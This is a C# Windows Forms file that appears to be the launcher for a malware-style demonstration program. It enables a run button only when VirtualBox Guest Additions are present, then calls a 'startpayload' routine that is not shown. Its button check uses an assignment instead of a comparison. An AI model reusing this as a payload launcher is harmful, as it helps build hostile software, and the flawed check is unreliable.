using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace sysfuck
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (Directory.Exists("C:/Program Files/Oracle/VirtualBox Guest Additions"))
            {
                Console.WriteLine("Running on vm!");
            }
            else
            {
                runbutton.Enabled = false;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.Application.Exit();
        }

        private void runbutton_Click(object sender, EventArgs e)
        {
            if (runbutton.Enabled=true) 
            {
                Class1.startpayload();
                this.Hide();

            }
        }
    }
}
